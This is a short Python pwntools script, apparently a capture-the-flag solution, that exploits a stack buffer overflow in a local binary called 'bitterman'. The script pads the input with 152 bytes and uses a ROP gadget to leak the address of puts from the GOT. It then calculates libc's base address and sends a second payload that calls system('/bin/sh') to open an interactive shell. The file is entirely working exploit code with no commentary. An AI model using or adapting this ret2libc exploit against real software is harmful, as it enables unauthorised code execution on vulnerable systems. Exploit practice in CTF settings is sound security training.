from pwn import *

p = process("./bitterman")
elf = ELF("bitterman")
libc = elf.libc

pop_rdi = p64(0x400853) #: pop rdi ; ret

payload = ""
payload += "A"*152
payload += pop_rdi
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['main'])


p.sendlineafter("? \n", "iulian")
p.sendlineafter(": \n", "1024")
p.sendlineafter(": \n", payload)

p.recvline()

leaked_puts = u64(p.recvline().strip().ljust(8, "\x00"))
libc.address = leaked_puts - libc.symbols['puts']
system = libc.symbols['system']
bin_sh = next(libc.search('/bin/sh\x00'))

log.info("Leaked puts: " + hex(leaked_puts))
log.info("Libc address: " + hex(libc.address))
log.info("System: " + hex(system))
log.info("/bin/sh: " + hex(bin_sh))


payload = ""
payload += "A"*152
payload += pop_rdi
payload += p64(bin_sh)
payload += p64(system)

p.sendlineafter("? \n", "iulian")
p.sendlineafter(": \n", "1024")
p.sendlineafter(": \n", payload)

p.interactive()
